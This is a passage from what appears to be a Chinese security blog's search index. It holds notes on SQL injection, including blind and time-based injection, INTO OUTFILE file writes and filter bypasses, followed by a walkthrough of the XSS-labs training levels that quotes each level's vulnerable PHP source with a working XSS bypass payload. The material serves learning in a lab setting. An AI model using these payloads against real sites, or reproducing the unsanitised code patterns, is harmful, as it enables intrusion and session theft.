NAME_CONST(version(),1),NAME_CONST(version(),1))x; &#x2F;&#x2F;mysql 重复特性，此处重复了 version，所以报错。基于时间的 SQL 盲注———-延时注入▲If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 &#x2F;&#x2F;if 判断语句，条件为假，执行 sleep导入导出相关操作导入到文件SELECT…..INTO OUTFILE ‘file_name’\nSelect  …… into outfile “c:\\phpnow\\htdocs\\test.php”\n增删改函数插入insert into users values(‘16’,’lcamry’,’lcamry’);\n删除删数据: delete from \n表名; delete from 表名 where id&#x3D;1; \n 删除结构： \n删数据库：drop database 数据库名; \n删除表：drop table 表名; \n删除表中的列:alter table 表名 drop column 列名;\nps:delete from users where id&#x3D;16\n修改&#x2F;更新修改所有：updata 表名 set 列名&#x3D;’新的值，非数字加单引号’ ; \n带条件的修改：updata 表名 set 列名&#x3D;’新的值，非数字加单引号’ where id&#x3D;6;\nps: update users set username&#x3D;’tt’ where id&#x3D;15\nHTTP 头部如何绕过 or 和 and 过滤。一般性提供以下几种思路：\n（1）大小写变形 Or,OR,oR \n（2）编码，hex，urlencode \n（3）添加注释&#x2F;or&#x2F; \n（4）利用符号 and&#x3D;&amp;&amp; or&#x3D;||\n对于注释和结尾字符的我们此处只能利用构造一个 ’ 来闭合后面到 ’ ；\n对于空格，有较多的方法：\n %09 TAB 键（水平）\n %0a 新建一行\n %0c 新的一页\n %0d return 功能 \n%0b TAB 键（垂直）\n %a0 空格\n","categories":["笔记"],"tags":["SQL注入"]},{"title":"XSS-labs通关笔记","url":"/2020/04/07/xss-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/","content":"XSS-labs通关笔记level 1\n我们可以看到这里将name的参数值，插入到了 中，这里就是反射型xss，直接给name重新赋值。\n\n服务器并没有进行任何的过滤，我们可以看看服务器端\n服务器端源代码&lt;/script&gt;\n&lt;title&gt;欢迎来到level1&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;\n&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;name&quot;];                                                         &#x2F;&#x2F;这里将name赋值给了str\necho &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;       &#x2F;&#x2F;这里直接将str插入了标签之间,导致反射型xss形成\n**?&gt;**\n&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;\n&lt;?php \necho &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;\n?&gt;\n&lt;/body&gt;\n&lt;/html&gt;\nlevel 2\n可以发现，通过get传参提交，经过服务器的动态处理之后又会将参数keyword的值插入到&lt;h2&gt; &lt;/h2&gt;标签之中以及\n添加到&lt;input&gt;标签中的value属性的值内。\n我们尝试用上关的payload提交\n\n可以看到，在&lt;h2&gt; &lt;/h2&gt;标签之中的恶意代码被编码了，其中&lt;和&gt;都被编码成了html字符实体，猜测在服务器端用htmlspecialchars()函数对keyword参数的值进行了处理，接着往下看可以看到插入到value参数值中的恶意代码并没有被编码而是直接原样返回，但是问题是这里的js代码在标签属性值中，浏览器是无法执行的，既然上面的恶意代码被编码了，那么只能从属性值中的恶意代码处进行突破了。\n要想浏览器执行这里的弹窗代码，只需要将属性的引号和标签先闭合就可以了\n用”&gt;闭合前面的&lt;input，再用&#x2F;&#x2F;将后面的”注释掉。\npayload：n3ym4r&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;//\n服务器端源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];&#x2F;&#x2F;将get方式传递到服务器端的keyword参数的值赋给str变量\necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n &#x2F;&#x2F;用htmlspecialchars()函数对变量str进行处理之后显示到网页上\n&lt;form action=level2.php method=GET&gt;\n&lt;input name=keyword  value=&quot;&#39;.$str.&#39;&quot;&gt;&#x2F;&#x2F;直接将变量值插入到了&lt;input&gt;标签的value属性值中\n&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\n&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;\n&lt;?php \necho &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;\n?&gt;\nlevel 3简单测试，发现与第二关相比，这里将属性值这里也进行了htmlspecialchars()函数处理。\n\n这里，无法使用标签，因为标签都是带有&lt;&gt;符号的，就会被转义。但该函数不会转义单引号，可以采用事件闭合标签。\npayload &#39; onclick=&#39;alert(1)&#x2F;&#x2F;当单击鼠标时运行脚本\n&#39; onmouseover=&#39;alert(1)&#x2F;&#x2F;当鼠标指针移至元素之上时运行脚本\n源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];\necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;\n&lt;form action=level3.php method=GET&gt;\n&lt;input name=keyword  value=&#39;&quot;.htmlspecialchars($str).&quot;&#39;&gt;   \n&lt;input type=submit name=submit value=搜索 /&gt;\n&lt;/form&gt;\n&lt;/center&gt;&quot;;\n?&gt;\nhtmlspecialchars ()将特殊字符转换为html实体\nlevel 4\n可以看到&lt;&gt;符号被替换成了空\n但是事件不需要用到&lt;&gt;，所以直接用鼠标事件插入\npayload&quot; onmouseover=&quot;alert(/xss/)\n我们还是同样需要闭合他原来的语句。\n源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];\n$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str); \n$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);&#x2F;&#x2F;将&lt;&gt;替换为空\necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form action=level4.php method=GET&gt;\n&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;\n&lt;input type=submit name=submit value=搜索 /&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\nlevel 5源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = strtolower($_GET[&quot;keyword&quot;]);\n$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);\n$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);\necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form action=level5.php method=GET&gt;\n&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;\n&lt;input type=submit name=submit value=搜索 /&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\n可以看到将&lt;script替换为了&lt;scr_ipt,同时也将on替换为了o_n,这使得我们无法通过&lt;script&gt;标签或触发事件来执行js代码，那么我们可以换个标签，使用a标签的js伪协议实现href属性支持javascript:伪协议构造poc 产生一个链接\npayload&quot;&gt; &lt;a href=javascript:alert(&#39;xss&#39;) &gt; xss&lt;/a&gt; //\nlevel 6源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];\n$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);&#x2F;&#x2F;限制&lt;script恶意代码\n$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);&#x2F;&#x2F;限制带on的事件\n$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);&#x2F;&#x2F;限制图片标签，&lt;img src&#x3D;111 onerror&#x3D;alert(‘xss’)&gt;\n$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);&#x2F;&#x2F;data:对字符编码的一种设定\n$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);&#x2F;&#x2F;限制通过在href属性中插入js代码来点击执行\necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form action=level6.php method=GET&gt;\n&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;\n&lt;input type=submit name=submit value=搜索 /&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\n可以看到做了很多限制，但是都是判断的整个字符，我们可以大小写绕过\npayload&quot;&gt;&lt;sCrIpt&gt;alert(/xss/)&lt;/ScRipt&gt;\nlevel 7源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str =strtolower( $_GET[&quot;keyword&quot;]);\n$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);&#x2F;&#x2F;将script替换为空，以下同理\n$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);\n$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);\n$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);\n$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);\necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form action=level7.php method=GET&gt;\n&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;\n&lt;input type=submit name=submit value=搜索 /&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\n因为只会对整个字符串进行一次替换，所以我们可以使用双写绕过\npayload&quot;&gt;&lt;scscriptript&gt;alert(1)&lt;/scrscriptipt&gt;\nlevel 8源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = strtolower($_GET[&quot;keyword&quot;]);\n$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);\n$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);\n$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);\n$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);\n$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);\n$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);\necho &#39;&lt;center&gt;\n&lt;form action=level8.php method=GET&gt;\n&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;\n&lt;input type=submit name=submit value=添加友情链接 /&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\n&lt;?php\n echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;; &#x2F;&#x2F;在这里进行拼接\n?&gt;\n&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;\n&lt;?php \necho &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;\n?&gt;\n可以看到将大部分能用到的字符都做了破坏，看到友情链接那里，我们可以使用编码的方式绕过\n\npayload&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;\nlevel 9源代码&lt;?php \n\nini_set(&quot;display_errors&quot;, 0);\n\n$str = strtolower($_GET[&quot;keyword&quot;]);\n\n$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);\n\n$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);\n\n$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);\n\n$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);\n\n$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);\n\n$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);\n\necho &#39;&lt;center&gt;\n\n&lt;form action=level9.php method=GET&gt;\n\n&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;\n\n&lt;input type=submit name=submit value=添加友情链接 /&gt;\n\n&lt;/form&gt;\n\n&lt;/center&gt;&#39;;\n\n?&gt;\n\n&lt;?php\n\nif(false===strpos($str7,&#39;http://&#39;))  \n\n&#123;\n\n echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;\n\n   &#125;\n\nelse\n\n&#123;\n\n echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;\n\n&#125;\n\n?&gt;\n\n&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;\n\n&lt;?php \n\necho &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;\n\n?&gt;\n\nif(false&#x3D;&#x3D;&#x3D;strpos($str7,’http:&#x2F;&#x2F;‘))  判断是否包含http:&#x2F;&#x2F;然后返回,这里还是可以通过编码来绕过\npayload&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;//http://\nlevel 10\n可以看到有三个input标签，我们得测试出哪个表单可以突破\n构造语句：?keyword=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&amp;t_link=&quot; type=&quot;text&quot;&amp;t_history=&quot; type=&quot;text&quot;&amp;t_sort=&quot; type=&quot;text&quot;\n\nt_sort时，出现一个输入框，所以我们可以确定了\npayload?keyword=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)\n源代码我们可以再看看源代码\n&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];\n$str11 = $_GET[&quot;t_sort&quot;];\n$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);\n$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);\necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form id=search&gt;\n&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\n可以看到，我们的猜测没错,值得注意的是，这里会将&lt;&gt;替换为空，不能通过闭合input，引入新的标签来触发，只能通过事件来触发。\nlevel 11源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];\n$str00 = $_GET[&quot;t_sort&quot;];\n$str11=$_SERVER[&#39;HTTP_REFERER&#39;];\n$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);\n$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);\necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form id=search&gt;\n&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_ref&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\n这一关卡和上面的一关非常的像多了一个input表单的信息，在服务器端还将请求头中的referer头的值赋给了str11这个变量，$_SERVER[‘HTTP_REFERER’]  #链接到当前页面的前一页面的 URL 地址，也就是说这里可以做点文章。在将变量值中的&lt;和&gt;删除之后就会插入到t_ref这个标签的value属性值中。而上一关的t_sort标签虽然也能接收并显示参数值，但是这个参数值是要用htmlspecialchars()函数处理的。\n这里，我们就可以抓包，将数据包中的referer改为我们的恶意代码\n\npayloadreferer:&quot;type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)\nlevel 12\n查看网页源码，我们发现，有一个和ua头一样的参数值，我们可以大胆猜测，这关测试点就在ua头，抓包改包试试\n\n成功\npayloadUser-Agent: &quot;type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)\n源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];\n$str00 = $_GET[&quot;t_sort&quot;];\n$str11=$_SERVER[&#39;HTTP_USER_AGENT&#39;];\n$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);\n$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);\necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form id=search&gt;\n&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_ua&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\n将keyword参数的值赋给了变量str\n将t_sot参数的值赋给了变量str00，\n将请求中User-Agent头的值赋给了变量str11,。\n将变量str11的值中存在的&lt;和&gt;删除之后直接插入到了t_ua标签的value\n属性值中。\n在这里变量str和str00的值都是需要被htmlspecialchars()函数处理过\nlevel 1313关猜测还是与数据头有关\n\n\n可以看到，是将cookies里的值放入了t_cook中，修改为恶意代码\npayloadCookie: user=1&quot; type=&quot;text&quot; onclick=&quot;alert(1)&quot;\n源代码&lt;?php \nsetcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);\nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;keyword&quot;];\n$str00 = $_GET[&quot;t_sort&quot;];\n$str11=$_COOKIE[&quot;user&quot;];\n$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);\n$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);\necho &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;\n&lt;form id=search&gt;\n&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;input name=&quot;t_cook&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;\n&lt;/form&gt;\n&lt;/center&gt;&#39;;\n?&gt;\nlevel 14修改iframe调用的文件来实现xss注入(但因为iframe调用的文件地址失效，无法进行测试\nlevel 15\n可以看到我们提交的src参数被插入到了&lt;span&gt;标签的class属性值中，但是前面还有ng-include这样的字符。\nng-include是angular js中的东西，其作用相当于php的include函数。这里就是将1.gif这个文件给包含进来。\nng-include相关知识点1、ng-include 指令用于包含外部的 HTML文件。\n2、包含的内容将作为指定元素的子节点。\n3、ng-include 属性的值可以是一个表达式，返回一个文件名。\n4、默认情况下，包含的文件需要包含在同一个域名下。\n特别值得注意的几点如下：\n1.ng-include,如果单纯指定地址，必须要加引号\n2.ng-include,加载外部html，script标签中的内容不执行\n3.ng-include,加载外部html中含有style标签样式可以识别\n构造函数?src&#x3D;’level1.php?name&#x3D;‘因为这里参数值算是一个地址，所以需要添加引号。\n但是level1.php不是一个php文件吗？\n这里解释一下，这是因为我们不是单纯的去包含level1.php，而是在后面添加了name参数值的。这就有点像是在访问了该参数值中地址之后把它响应在浏览器端的html文件给包含进来的意思。\npayload?src=&#39;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#39;\n源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;src&quot;];\necho &#39;&lt;body&gt;&lt;span class=&quot;ng-include:&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#39;;\n?&gt;\nlevel 16\n可以看到，我们输入的值被插到了标签中，我们尝试直接弹窗，发现很多字符被编码，来看看源代码\n源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = strtolower($_GET[&quot;keyword&quot;]);\n$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);\n$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);\n$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);\n$str5=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str4);\necho &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;\n?&gt;\n&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;\n&lt;?php \necho &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str5).&quot;&lt;/h3&gt;&quot;;\n?&gt;\n可以看到，将参数值中的script替换成&amp;nbsp;，将参数值中的空格也替换成&amp;nbsp;，将参数值中的&#x2F;符号替换成&amp;nbsp;\n与我们的猜想一致\n绕过思路：可以用回车来将它们分开。\n而且这里&#x2F;符号也被编码了，所以我们需要的是一个不需要闭合的标签，比\n如之前所用过的\n\n\n回车可以用url编码%0a表示\npayload&lt;img%0Asrc=1%0Aonerror=alert(1)&gt;\nlevel 17\n可以看到提交的参数插入到了标签的src属性中，尝试直接弹窗，发现转义了很多符号。\n尝试构造事件弹窗，可以看到这里的src没有用引号闭合，我们就不用管\npayloadonclick=alert(&#39;xss&#39;)\nonmousedown=&#39;alert(1)&#39;\n\n\n源代码&lt;?php·\nini_set(&quot;display_errors&quot;, 0);\necho &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;\n?&gt;\n可以看到和我们的猜测一致\nlevel 18与17关一致\nlevel 19与之前一致，不过用了引号将src闭合，所以不能直接在后面添加语句，我们可以通过F12控制台添加\n","categories":["笔记"],"tags":["笔记"]}]